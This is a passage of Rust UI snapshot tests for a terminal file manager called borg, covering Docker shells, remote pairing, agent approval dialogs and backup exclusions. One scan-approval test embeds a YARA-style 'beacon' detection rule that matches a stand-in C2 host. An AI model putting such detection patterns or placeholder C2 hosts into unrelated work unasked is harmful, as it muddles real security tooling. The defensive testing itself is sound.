        source: Some(PathBuf::from("/").join(name)),
        ..entry(name, EntryKind::Dir, 4096, RECENT, false)
    };
    let entries = vec![
        folder("etc"),
        folder("usr"),
        folder("var"),
        entry("docker-entrypoint.sh", EntryKind::File, 1620, RECENT, true),
    ];
    stage.send(Msg::Batch { side, generation, entries }).send(Msg::Listed { side, generation, error: None });
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "▣ shop-web-1")?;
    ensure_text(&buffer, "Alt-C Docker")?;
    check("docker_files", &stage, buffer)
}

/// E opens a shell in the details panel: the Shell tab shows it, the list marks the
/// container, and the key bar says where keys go.
#[test]
fn docker_shell_runs_in_the_details_panel() -> Result<()> {
    use borg_core::{DockerData, DockerRequest};
    use borg_docker::State;
    let mut stage = stage(GridSize { cols: 110, rows: 24 }, Motion::STILL)?;
    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('c'), KeyModifiers::ALT)));
    let Some((id, DockerRequest::List)) = stage.state.docker.pending.clone() else {
        panic!("opening lists containers")
    };
    let containers = vec![
        container("a1", Some("shop"), "web", State::Running, "Up 3 hours"),
        container("a2", Some("shop"), "db", State::Running, "Up 3 hours"),
    ];
    stage.send(Msg::Docker { id, result: Ok(DockerData::Listed { context: None, containers }) });
    stage.send(key(KeyCode::Down)).send(key(KeyCode::Down)).send(key(KeyCode::Char('e')));
    assert!(stage.state.docker.typing());
    let side = stage.state.docker.side.unwrap().other();
    let area = borg_core::shell_rect(stage.state.layout(stage.started).panels[side.index()]);
    let mut shell = borg_term::Emulator::new(GridSize { cols: area.width, rows: area.height }, 100);
    shell.feed(b"root@3f2a9c:/usr/share/nginx/html# ls\r\n50x.html  index.html\r\nroot@3f2a9c:/usr/share/nginx/html# ");
    stage.docker_shell = Some(shell);
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "index.html")?;
    ensure_text(&buffer, "2 Shell ●")?;
    ensure_text(&buffer, "web ›_")?;
    check("docker_shell", &stage, buffer)
}

#[test]
fn remote_access_shows_the_pairing_link_and_takes_a_relay() -> Result<()> {
    let mut stage = stage(GridSize { cols: 90, rows: 34 }, Motion::STILL)?;
    stage.state.agent.connect = borg_core::ConnectInfo {
        name: "borg-web1".into(),
        program: "/home/deploy/.local/bin/borg".into(),
        ssh: Some("deploy@203.0.113.9".into()),
        relay: "wss://relay.example.com".into(),
    };
    stage.state.agent.computers = vec!["me@laptop".into()];
    stage.send(key(KeyCode::F(1))).send(key(KeyCode::Char('c')));
    let link = format!("borg://relay.example.com/{}#{}", "ab".repeat(32), "cd".repeat(16));
    stage.send(Msg::Agent(borg_core::AgentEvent::Pairing(Ok(link))));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Relay: wss://relay.example.com")?;
    check("remote_access", &stage, buffer)?;
    // A relay typed over the saved one: Enter saves it.
    for _ in 0.."relay.example.com".len() {
        stage.send(key(KeyCode::Backspace));
    }
    chars("relay.example.org").for_each(|msg| {
        stage.send(msg);
    });
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Enter saves the relay")?;
    check("remote_access_new_relay", &stage, buffer)
}

#[test]
fn pairing_asks_with_the_code_both_ends_show() -> Result<()> {
    use borg_core::AgentEvent;
    let mut stage = stage(SIZE, Motion::STILL)?;
    let code = borg_link::PairingCode::of(&[0x04, 0x20, 0xc4, 0x14, 0x61, 0x8b, 0, 0]);
    let ask = borg_core::pair_ask("me@laptop", &code.rows(true));
    stage.send(Msg::Agent(AgentEvent::Ask { id: 1, ask }));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "shows this code")?;
    check("pairing_code", &stage, buffer)
}

#[test]
fn a_locked_computer_key_asks_for_its_password_without_showing_it() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    stage.send(Msg::ComputerKeyLocked { wrong: false });
    for msg in chars("rain cobalt") {
        stage.send(msg);
    }
    let buffer = stage.render(stage.started + PASSWORD_SETTLED)?;
    ensure_text(&buffer, "Unlock key")?;
    anyhow::ensure!(!describe(&buffer).contains("cobalt"), "the password must stay hidden");
    check("computer_key_password", &stage, buffer)
}

#[test]
fn a_pairing_approval_shows_over_the_remote_access_dialog() -> Result<()> {
    use borg_core::AgentEvent;
    let mut stage = stage(GridSize { cols: 90, rows: 34 }, Motion::STILL)?;
    stage.state.agent.connect = borg_core::ConnectInfo {
        name: "borg-web1".into(),
        program: "/home/deploy/.local/bin/borg".into(),
        ssh: Some("deploy@203.0.113.9".into()),
        relay: "wss://relay.example.com".into(),
    };
    stage.send(key(KeyCode::F(1))).send(key(KeyCode::Char('c')));
    let link = format!("borg://relay.example.com/{}#{}", "ab".repeat(32), "cd".repeat(16));
    stage.send(Msg::Agent(AgentEvent::Pairing(Ok(link))));
    let code = borg_link::PairingCode::of(&[0x04, 0x20, 0xc4, 0x14, 0x61, 0x8b, 0, 0]);
    let ask = borg_core::pair_ask("me@laptop", &code.rows(true));
    stage.send(Msg::Agent(AgentEvent::Ask { id: 1, ask }));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Pair this computer with borg?")?;
    ensure_text(&buffer, "Tab picks · Enter copies")?;
    check("pairing_over_remote_access", &stage, buffer)
}

#[test]
fn a_narrow_pairing_dialog_keeps_its_words_and_code_whole() -> Result<()> {
    use borg_core::AgentEvent;
    let mut stage = stage(GridSize { cols: 46, rows: 22 }, Motion::STILL)?;
    let code = borg_link::PairingCode::of(&[0x04, 0x20, 0xc4, 0x14, 0x61, 0x8b, 0, 0]);
    let ask = borg_core::pair_ask("me@laptop", &code.rows(true));
    stage.send(Msg::Agent(AgentEvent::Ask { id: 1, ask }));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "code on that computer.")?;
    check("pairing_code_narrow", &stage, buffer)
}

#[test]
fn a_narrow_approve_all_dialog_breaks_between_words() -> Result<()> {
    use borg_core::AgentEvent;
    let mut stage = stage(GridSize { cols: 46, rows: 20 }, Motion::STILL)?;
    let ask = borg_core::approve_all_ask("dev@harbor [873dd93b…]", "Default");
    stage.send(Msg::Agent(AgentEvent::Ask { id: 1, ask }));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "individual")?;
    check("approve_all_narrow", &stage, buffer)
}

/// What the borg on `web1` says waits in its Default session: a command an agent on another
/// computer asks to run.
fn host_feed(view_only: Option<&str>, approve_all: &[&str]) -> borg_core::AskFeed {
    use borg_core::{Ask, AskKind, DiffLine, Waiting};
    let command = "systemctl reload nginx";
    let ask = Ask {
        kind: AskKind::Run,
        summary: command.into(),
        place: "~/srv/menu".into(),
        origin: Some("dev@harbor [873dd93b…]".into()),
        body: vec![DiffLine::code(command)],
    };
    borg_core::AskFeed {
        run: "a1".into(),
        version: 1,
        waiting: if approve_all.is_empty() { vec![Waiting { id: 3, ask }] } else { Vec::new() },
        ended: Vec::new(),
        approve_all: approve_all.iter().map(|origin| (*origin).to_owned()).collect(),
        view_only: view_only.map(str::to_owned),
    }
}

fn host_asks(feed: borg_core::AskFeed) -> Msg {
    Msg::HostAsks { machine: "web1".into(), session: "default".into(), event: borg_core::HostEvent::Feed(feed) }
}

#[test]
fn a_request_waiting_on_a_watched_host_shows_over_the_local_panels() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    stage.send(host_asks(host_feed(None, &[])));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Remote on web1")?;
    ensure_text(&buffer, "systemctl reload nginx")?;
    check("agent_host_run_approval", &stage, buffer)
}

#[test]
fn a_request_on_a_host_another_computer_controls_shows_without_answers() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    stage.send(host_asks(host_feed(Some("ops@desk [5f0e11aa…]"), &[])));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "View only: ops@desk controls this session")?;
    check("agent_host_view_only", &stage, buffer)
}

#[test]
fn approve_all_on_a_watched_host_shows_a_badge_that_stops_it() -> Result<()> {
    let mut stage = stage(SIZE, Motion::STILL)?;
    stage.send(host_asks(host_feed(None, &["dev@harbor [873dd93b…]"])));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Approve all on web1")?;
    check("agent_host_approve_all_badge", &stage, buffer)
}

#[test]
fn a_capture_asks_with_its_traffic_interface_and_length() -> Result<()> {
    use borg_core::{AgentEvent, CaptureRequest, CaptureScope, Transport};
    let mut stage = stage(SIZE, Motion::STILL)?;
    let request = CaptureRequest {
        interface: "en0".into(),
        seconds: Some(10),
        keep: Keep::Whole,
        filter: "udp port 53".into(),
        folder: "/home/dev/work".into(),
        administrator: false,
        processes: false,
        tls_keys: borg_core::TlsKeys::Off,
        keep_free_mib: None,
    };
    let scope = CaptureScope::Port { transport: Transport::Udp, port: 53 };
    let ask = borg_core::capture_ask(scope, None, &request, None);
    stage.send(Msg::Agent(AgentEvent::Ask { id: 1, ask }));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Remote wants to capture traffic")?;
    check("agent_capture_approval", &stage, buffer)
}

#[test]
fn a_file_another_computer_asks_to_create_names_that_computer_after_the_path() -> Result<()> {
    use borg_core::{AgentEvent, Ask, AskKind, Change, DiffLine};
    let mut stage = stage(SIZE, Motion::STILL)?;
    let site = "server {\n    listen 80;\n    server_name menu.example.com;\n    root /srv/menu;\n}";
    let body =
        (1..).zip(site.lines()).map(|(number, line)| DiffLine::diff(Change::Added, Some(number), line)).collect();
    let ask = Ask {
        kind: AskKind::Create,
        summary: "/etc/nginx/sites-available/menu".into(),
        place: String::new(),
        origin: Some("dev@harbor [873dd93b…]".into()),
        body,
    };
    stage.send(Msg::Agent(AgentEvent::Ask { id: 1, ask }));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "/etc/nginx/sites-available/menu · asked from dev@harbor [873dd93b…]")?;
    check("agent_remote_create_approval", &stage, buffer)
}

#[test]
fn an_upload_names_the_file_it_sends_from_the_other_computer() -> Result<()> {
    use borg_core::AgentEvent;
    let mut stage = stage(SIZE, Motion::STILL)?;
    let ask = borg_core::upload_ask(
        "/srv/menu/prices.csv".into(),
        Some("~/work/menu/prices.csv"),
        format!("{} (4200 bytes)", borg_ui::size_text(4200)),
        Some("dev@harbor [873dd93b…]".into()),
    );
    stage.send(Msg::Agent(AgentEvent::Ask { id: 1, ask }));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Source: ~/work/menu/prices.csv")?;
    check("agent_upload_approval", &stage, buffer)
}

#[test]
fn a_scan_asks_with_the_process_the_checks_and_the_agents_own_rules() -> Result<()> {
    use borg_core::{AgentEvent, ScanChecks, ScanSubject};
    let mut stage = stage(SIZE, Motion::STILL)?;
    let program = std::path::Path::new("/usr/bin/sample");
    let subject = ScanSubject { name: "sample", pid: 4100, program: Some(program) };
    let rules = "rule beacon {\n  strings: $host = \"c2.example.org\"\n  condition: $host\n}";
    let ask = borg_core::scan_ask(subject, ScanChecks::Both, Some(rules), Some("laptop".into()));
    stage.send(Msg::Agent(AgentEvent::Ask { id: 1, ask }));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Remote wants to scan process memory")?;
    check("agent_scan_approval", &stage, buffer)
}

#[test]
fn remote_console_names_the_host_and_session_and_mounts_the_right_panel() -> Result<()> {
    use borg_core::Side;
    let mut stage = stage(GridSize { cols: 110, rows: 24 }, Motion::STILL)?;
    stage.state.active = Side::Right;
    stage.send(Msg::MountRemote {
        side: Side::Right,
        machine: "prod".into(),
        session: "session-id".into(),
        name: "Deploy".into(),
    });
    let generation = stage.state.panel(Side::Right).generation();
    stage.send(Msg::Batch {
        side: Side::Right,
        generation,
        entries: vec![entry("etc", EntryKind::Dir, 4096, RECENT, false)],
    });
    stage.send(Msg::Listed { side: Side::Right, generation, error: None });
    stage.emulator.feed(b"\x1b[2J\x1b[Hremote:/# ");
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Host prod:Deploy")?;
    check("remote_console_panels", &stage, buffer)?;
    stage.send(ctrl('o'));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Host prod:Deploy console")?;
    check("remote_console", &stage, buffer)
}

#[test]
fn remote_console_failure_remains_visible_when_typing() -> Result<()> {
    use borg_core::Side;
    let mut stage = stage(GridSize { cols: 110, rows: 24 }, Motion::STILL)?;
    stage.send(Msg::MountRemote {
        side: Side::Left,
        machine: "prod".into(),
        session: "id".into(),
        name: "Deploy".into(),
    });
    let error = "Host prod does not support remote consoles. Update and restart its Borg binary.";
    stage.send(Msg::RemoteConsoleClosed { machine: "prod".into(), session: "id".into(), error: error.into() });
    stage.send(key(KeyCode::Char('a')));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, error)?;
    check("remote_console_failure", &stage, buffer)
}

#[test]
fn raw_remote_app_owns_the_screen_without_using_an_alternate_buffer() -> Result<()> {
    use borg_core::{ShellView, Side};
    let mut stage = stage(GridSize { cols: 110, rows: 24 }, Motion::STILL)?;
    stage.send(Msg::MountRemote {
        side: Side::Left,
        machine: "prod".into(),
        session: "id".into(),
        name: "Deploy".into(),
    });
    stage.emulator.feed(
        b"\x1b[2J\x1b[Htop - remote host\r\nPID  USER      COMMAND\r\n123  admin     worker\r\n456  admin     top",
    );
    stage.send(Msg::Observe(ShellView {
        foreground: borg_term::Foreground::Program,
        raw_input: true,
        ..Default::default()
    }));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "top - remote host")?;
    ensure_text(&buffer, "Host prod:Deploy console")?;
    ensure_text(&buffer, "program running")?;
    check("remote_raw_app", &stage, buffer)
}

#[test]
fn remote_labels_are_visible_in_picker_rename_prompt_panels_and_console() -> Result<()> {
    use borg_core::{RemoteChoice, RemoteHostInfo, RemoteNames, Side};
    let mut stage = stage(GridSize { cols: 130, rows: 28 }, Motion::STILL)?;
    let choices = vec![RemoteChoice {
        identity: "paired-key".into(),
        machine: "demo-host".into(),
        session: Some("default".into()),
        name: "Default".into(),
        info: RemoteHostInfo {
            version: Some("0.8.0".into()),
            platform: Some("linux / x86_64".into()),
            service: Some(true),
            latency_ms: Some(172),
            relay: "wss://relay.example".into(),
        },
        ..Default::default()
    }];
    let mut names = RemoteNames::default();
    names.set("paired-key", None, "Docker Lab").unwrap();
    names.set("paired-key", Some("default"), "Deploy").unwrap();
    stage.send(Msg::RemoteNames(Ok(names)));
    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('h'), KeyModifiers::ALT)));
    stage.send(Msg::RemoteCatalog { choices, complete: true });
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Host Docker Lab · Deploy · v0.8.0")?;
    ensure_text(&buffer, "Original host: demo-host · Session: Default")?;
    ensure_text(&buffer, "F2: rename host")?;
    check("remote_labels_picker", &stage, buffer)?;
    stage.send(key(KeyCode::F(2)));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Rename host label")?;
    ensure_text(&buffer, "Docker Lab")?;
    check("remote_labels_prompt", &stage, buffer)?;
    stage.send(key(KeyCode::Esc)).send(key(KeyCode::Esc));
    stage.send(Msg::MountRemote {
        side: Side::Left,
        machine: "demo-host".into(),
        session: "default".into(),
        name: "Default".into(),
    });
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Host Docker Lab:Deploy")?;
    check("remote_labels_panels", &stage, buffer)?;
    stage.send(ctrl('o'));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Host Docker Lab:Deploy console")?;
    check("remote_labels_console", &stage, buffer)
}

#[test]
fn remote_panel_copy_identifies_the_destination_and_shows_transfer_progress() -> Result<()> {
    use borg_core::{Action, Pointer, Side};
    let mut stage = stage(GridSize { cols: 132, rows: 28 }, Motion::STILL)?;
    stage.send(key(KeyCode::Down));
    stage.send(Msg::MountRemote {
        side: Side::Right,
        machine: "deploy".into(),
        session: "work".into(),
        name: "Work".into(),
    });
    stage.send(Msg::Pointer(Pointer::Action(Action::Copy)));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "host deploy:Work")?;
    check("remote_copy_prompt", &stage, buffer)?;
    stage.send(key(KeyCode::Enter));
    let id = stage.state.jobs.last().unwrap().id;
    stage.send(Msg::Job {
        id,
        event: borg_jobs::Event::Progress(borg_jobs::Progress {
            done: borg_jobs::Totals { files: 1, bytes: 262144 },
            total: borg_jobs::Totals { files: 3, bytes: 1048576 },
            current: PathBuf::from("/tmp/deploy/archive.bin"),
        }),
    });
    let buffer = stage.render(stage.started)?;
    check("remote_copy_progress", &stage, buffer)
}

#[test]
fn regular_mirror_host_shows_remote_control_and_local_reclamation() -> Result<()> {
    let mut stage = stage(GridSize { cols: 132, rows: 28 }, Motion::STILL)?;
    stage.state.notice = Some(borg_i18n::tr!(mirror_remote_control).replace("{computer}", "Laptop"));
    let buffer = stage.render(stage.started)?;
    check("regular_mirror_remote_control", &stage, buffer)?;
    stage.state.notice = Some(borg_i18n::tr!(mirror_local_control).into());
    let buffer = stage.render(stage.started)?;
    check("regular_mirror_local_control", &stage, buffer)
}

#[test]
fn translated_panels_language_picker_and_confirmation() -> Result<()> {
    for locale in borg_i18n::Locale::ALL.into_iter().skip(1) {
        let mut stage = stage(GridSize { cols: 110, rows: 28 }, Motion::STILL)?;
        stage.state.settings.preferences.language = locale;
        let buffer = stage.render(stage.started)?;
        check(&format!("locale_{}_panels", locale.code()), &stage, buffer)?;
        stage.send(Msg::Pointer(borg_core::Pointer::Action(borg_core::Action::PickLanguage)));
        let buffer = stage.render(stage.started)?;
        ensure_text(&buffer, locale.name())?;
        check(&format!("locale_{}_language_picker", locale.code()), &stage, buffer)?;
        stage.send(key(KeyCode::Esc));
        stage.send(key(KeyCode::F(10)));
        let buffer = stage.render(stage.started)?;
        check(&format!("locale_{}_quit", locale.code()), &stage, buffer)?;
    }
    Ok(())
}

#[test]
fn unavailable_hosts_can_be_forgotten_with_a_local_confirmation() -> Result<()> {
    let mut stage = staged(Motion::STILL, QUIET, project(), CLOCK)?;
    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('h'), KeyModifiers::ALT)));
    stage.send(Msg::RemoteCatalog {
        choices: vec![borg_core::RemoteChoice {
            machine: "offline-lab".into(),
            name: "Unavailable: connection timed out".into(),
            ..Default::default()
        }],
        complete: true,
    });
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "F8: forget this unavailable host")?;
    check("remote_unavailable_host", &stage, buffer)?;
    stage.send(key(KeyCode::Char('m')));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "No session is available on offline-lab")?;
    ensure_text(&buffer, "R: refresh  F8: forget host")?;
    check("remote_unavailable_host_mirror", &stage, buffer)?;
    stage.send(key(KeyCode::F(8)));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Forget paired host")?;
    ensure_text(&buffer, "files are kept")?;
    check("remote_host_forget_confirm", &stage, buffer)?;
    stage.send(key(KeyCode::Char('y')));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "Forgetting the paired host")?;
    check("remote_host_forgetting", &stage, buffer)
}

/// Sends a message and returns the Time Machine requests it led to.
fn backup_requests(stage: &mut Stage, msg: Msg) -> Vec<borg_core::BackupRequest> {
    borg_core::update(&mut stage.state, msg, stage.started)
        .into_iter()
        .filter_map(|effect| match effect {
            borg_core::Effect::Backup(request) => Some(request),
            _ => None,
        })
        .collect()
}

fn backup_item(path: &str, dir: bool, size: Option<u64>, exclusion: borg_core::Exclusion) -> borg_core::BackupItem {
    borg_core::BackupItem { path: path.into(), dir, size, exclusion, ..borg_core::BackupItem::default() }
}

fn backup_found(stage: &mut Stage, request: &borg_core::BackupRequest, items: Vec<borg_core::BackupItem>) {
    use borg_core::{BackupEvent, BackupRequest};
    let (BackupRequest::Inspect { id, .. } | BackupRequest::Caches { id, .. } | BackupRequest::All { id, .. }) =
        *request
    else {
        panic!("not a search: {request:?}");
    };
    let sizes: Vec<_> = items.iter().filter_map(|item| Some((item.path.clone(), item.size?))).collect();
    stage.send(Msg::Backup(BackupEvent::Found { id, items }));
    for (path, bytes) in sizes {
        stage.send(Msg::Backup(BackupEvent::Sized { id, path, bytes }));
    }
    stage.send(Msg::Backup(BackupEvent::Progress { id, folders: 214 }));
    stage.send(Msg::Backup(BackupEvent::Finished { id, error: None }));
}

#[test]
fn time_machine_marks_excluded_entries_and_lists_exclusions_by_kind() -> Result<()> {
    use borg_core::{BackupEvent, BackupListing, BackupRequest, Exclusion};
    let mut stage = staged(Motion::STILL, Preferences { nerd_font: true, ..QUIET }, project(), CLOCK)?;
    stage.state.backup.available = true;
    let listings = backup_requests(&mut stage, key(KeyCode::Home));
    let Some(BackupRequest::Listing { side, generation, dir }) = listings.into_iter().next() else {
        anyhow::bail!("the panels ask which entries are excluded");
    };
    let listing = BackupListing { folder: Exclusion::Included, entries: vec![("target".into(), Exclusion::Sticky)] };
    stage.send(Msg::Backup(BackupEvent::Listing { side, generation, dir, result: Ok(listing) }));
    hover(&mut stage, "target");
    stage.send(ctrl('l'));
    let facts = borg_core::Facts {
        nature: borg_core::Nature::Folder,
        size: 4096,
        permissions: 0o755,
        owner: "me".into(),
        group: "staff".into(),
        modified: at(RECENT),
        accessed: at(RECENT),
        created: at(OLD),
        inode: 1_234_568,
        links: 4,
        items: Some(3),
        disk: None,
        backup: Some(Exclusion::Sticky),
        drive: None,
    };
    peek(&mut stage, borg_core::Aside::Info, borg_core::Peek::Info(facts))?;
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "⊘")?;
    ensure_text(&buffer, "1 item not backed up")?;
    ensure_text(&buffer, "Excluded · follows the item")?;
    check("time_machine_panel_marks", &stage, buffer)?;
    stage.send(ctrl('l'));

    let root = "/home/me/projects/borg";
    hover(&mut stage, "src");
    stage.send(key(KeyCode::Insert));
    hover(&mut stage, "target");
    stage.send(key(KeyCode::Insert));
    let opened = backup_requests(&mut stage, Msg::Key(KeyEvent::new(KeyCode::Char('t'), KeyModifiers::ALT)));
    let [inspect @ BackupRequest::Inspect { .. }] = &opened[..] else {
        anyhow::bail!("Alt-T inspects the selection: {opened:?}")
    };
    backup_found(
        &mut stage,
        inspect,
        vec![
            backup_item(&format!("{root}/src"), true, None, Exclusion::Included),
            backup_item(&format!("{root}/target"), true, None, Exclusion::Sticky),
        ],
    );
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "2 items in ~/projects/borg")?;
    check("time_machine_selection", &stage, buffer)?;

    let caches = backup_requests(&mut stage, key(KeyCode::Char('2')));
    let [caches @ BackupRequest::Caches { .. }] = &caches[..] else { anyhow::bail!("Caches looks for build folders") };
    backup_found(
        &mut stage,
        caches,
        vec![
            backup_item(&format!("{root}/target"), true, Some(7_516_192_768), Exclusion::Sticky),
            backup_item(&format!("{root}/website/node_modules"), true, Some(431_013_478), Exclusion::Included),
            backup_item(&format!("{root}/website/dist"), true, Some(12_582_912), Exclusion::Included),
            backup_item(&format!("{root}/scripts/__pycache__"), true, Some(86_016), Exclusion::Included),
            backup_item(
                &format!("{root}/target/doc"),
                true,
                Some(52_428_800),
                Exclusion::Inside(format!("{root}/target").into()),
            ),
        ],
    );
    stage.send(key(KeyCode::Down)).send(key(KeyCode::Char(' '))).send(key(KeyCode::Char(' ')));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "423M still backed up")?;
    check("time_machine_caches", &stage, buffer)?;

    let all = backup_requests(&mut stage, key(KeyCode::Char('3')));
    let [all @ BackupRequest::All { .. }] = &all[..] else { anyhow::bail!("All exclusions searches everywhere") };
    let missing =
        borg_core::BackupItem { missing: true, ..backup_item("/home/me/.cache/pip", true, None, Exclusion::Path) };
    backup_found(
        &mut stage,
        all,
        vec![
            backup_item(&format!("{root}/target"), true, None, Exclusion::Sticky),
            backup_item("/home/me/.npm", true, None, Exclusion::Path),
            missing,
            borg_core::BackupItem { volume: true, ..backup_item("/Volumes/Spare", true, None, Exclusion::Volume) },
            backup_item("/System", true, None, Exclusion::System),
            backup_item("/home/me/Library/Caches", true, None, Exclusion::System),
        ],
    );
    stage.send(key(KeyCode::Down)).send(key(KeyCode::Char('i')));
    anyhow::ensure!(
        stage.state.backup.window.working.is_some_and(|(_, password)| password),
        "a fixed path needs the password"
    );
    let buffer = stage.render(stage.started + Duration::from_secs(1))?;
    ensure_text(&buffer, "Fixed path · changing one asks for your password")?;
    ensure_text(&buffer, "Waiting for your password")?;
    let shot = Snapshot::from_buffer(buffer.clone(), &stage.palette, None);
    let at = |text: &str| {
        let (column, row) = shot.find(text).unwrap_or_else(|| panic!("{text} on screen\n{}", shot.lines().join("\n")));
        let down = crossterm::event::MouseEventKind::Down(crossterm::event::MouseButton::Left);
        let click = crossterm::event::MouseEvent { kind: down, column, row, modifiers: KeyModifiers::NONE };
        borg_ui::mouse_input(&stage.state, click, false, stage.started)
    };
    assert!(
        matches!(at("/System"), Some(Msg::Pointer(borg_core::Pointer::DialogRow(4)))),
        "a click finds the item under the headings above it"
    );
    check("time_machine_all", &stage, buffer)?;

    stage.send(key(KeyCode::Char('a'))).send(key(KeyCode::Tab)).send(key(KeyCode::Char(' ')));
    let buffer = stage.render(stage.started)?;
    ensure_text(&buffer, "[x] Fixed path")?;
    check("time_machine_add", &stage, buffer)
}

#[test]
fn time_machine_list_scrolls_only_when_the_cursor_leaves_it() -> Result<()> {
    use borg_core::{BackupRequest, Exclusion};
    let mut stage = staged(Motion::STILL, Preferences { nerd_font: true, ..QUIET }, project(), CLOCK)?;
    stage.state.backup.available = true;
    let opened = backup_requests(&mut stage, Msg::Key(KeyEvent::new(KeyCode::Char('t'), KeyModifiers::ALT)));
    let caches = opened.iter().find(|request| matches!(request, BackupRequest::Caches { .. }));
    let caches = caches.context("with nothing marked, Alt-T opens on Caches here")?.clone();
    let found = (0..40)
        .map(|n| {
            backup_item(&format!("/home/me/projects/borg/app{n:02}/node_modules"), true, None, Exclusion::Included)
        })
        .collect();
    backup_found(&mut stage, &caches, found);
    let row_of = |buffer: &Buffer, name: &str| {
        (0..buffer.area.height).find(|&y| {
            let line: String = (0..buffer.area.width).map(|x| buffer[(x, y)].symbol()).collect();
            line.contains(name)
        })
    };
    for _ in 0..20 {
        stage.send(key(KeyCode::Down));
    }
    let bottom = row_of(&stage.render(stage.started)?, "app20/").context("the cursor's row is shown")?;
    stage.send(key(KeyCode::Up)).send(key(KeyCode::Up));
    let buffer = stage.render(stage.started)?;
    anyhow::ensure!(
        row_of(&buffer, "app18/") == Some(bottom - 2),
        "moving up inside the list moves the cursor, not the list"
    );
    anyhow::ensure!(row_of(&buffer, "app20/") == Some(bottom), "the rows below the cursor stay where they were");
    Ok(())
}

#[test]
fn time_machine_window_takes_clicks_on_its_tabs_rows_and_keys() -> Result<()> {
    use borg_core::{BackupRequest, Exclusion, Pointer};
    use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};
    let mut stage = staged(Motion::STILL, Preferences { nerd_font: true, ..QUIET }, project(), CLOCK)?;
    stage.state.backup.available = true;
    let opened = backup_requests(&mut stage, Msg::Key(KeyEvent::new(KeyCode::Char('t'), KeyModifiers::ALT)));
    let caches = opened.iter().find(|request| matches!(request, BackupRequest::Caches { .. }));
    let caches = caches.context("with nothing marked, Alt-T opens on Caches here")?.clone();
    let found = (0..40)
        .map(|n| {
            backup_item(&format!("/home/me/projects/borg/app{n:02}/node_modules"), true, None, Exclusion::Included)
        })
        .collect();
    backup_found(&mut stage, &caches, found);
    for _ in 0..25 {
        stage.send(key(KeyCode::Down));
    }
    let event = |kind, (column, row)| MouseEvent { kind, column, row, modifiers: KeyModifiers::NONE };
    let left = MouseEventKind::Down(MouseButton::Left);
    let find = |stage: &mut Stage, text: &str| -> Result<(u16, u16)> {
        let screen = Snapshot::from_buffer(stage.render(stage.started)?, &stage.palette, None);
        screen.find(text).with_context(|| format!("{text} on screen\n{}", screen.lines().join("\n")))
    };
    let hit = |stage: &Stage, kind, at| borg_ui::mouse_input(&stage.state, event(kind, at), false, stage.started);
    let pressed = |msg: Option<Msg>, code| matches!(msg, Some(Msg::Key(KeyEvent { code: c, .. })) if c == code);
    let tap = |stage: &mut Stage, kind, text: &str| -> Result<Option<Msg>> {
        let at = find(stage, text)?;
        Ok(hit(stage, kind, at))
    };

    let row = tap(&mut stage, left, "app22/")?;
    assert!(
        matches!(row, Some(Msg::Pointer(Pointer::DialogRow(22)))),
        "a click finds rows in a scrolled list: {row:?}"
    );
    stage.send(row.unwrap());
    assert_eq!(stage.state.backup.window.list().cursor, 22);
    assert!(pressed(tap(&mut stage, left, "app22/")?, KeyCode::Enter), "a second click shows it");
    let mark = tap(&mut stage, MouseEventKind::Down(MouseButton::Right), "app23/")?;
    assert!(matches!(mark, Some(Msg::Pointer(Pointer::DialogMark(23)))), "{mark:?}");
    stage.send(mark.unwrap());
    let list = stage.state.backup.window.list();
    assert_eq!((list.cursor, list.marks.len()), (23, 1), "a right-click marks the row, as in the panels");
    let wheel = tap(&mut stage, MouseEventKind::ScrollDown, "app23/")?;
    stage.send(wheel.unwrap());
    assert_eq!(stage.state.backup.window.list().cursor, 24, "the wheel moves through the list");

    assert!(pressed(tap(&mut stage, left, "E Exclude")?, KeyCode::Char('e')));
    assert!(pressed(tap(&mut stage, left, "3 All exclusions")?, KeyCode::Char('3')));
    let beside = hit(&stage, left, (0, 1)).unwrap();
    let effects = borg_core::update(&mut stage.state, beside, stage.started);
    assert!(stage.state.overlay.is_none(), "a click beside the window closes it");
    assert!(effects.iter().any(|effect| matches!(effect, borg_core::Effect::Backup(BackupRequest::Cancel))));
    Ok(())
}

fn folders() -> borg_core::Folders {
    borg_core::Folders::new(
        vec!["/home/me/projects/site".into(), "/srv/www".into()],
        vec!["/home/me/Downloads".into(), "/var/log".into(), "/home/me/projects/borg".into()],
        Some(HOME.into()),
    )
}

#[test]
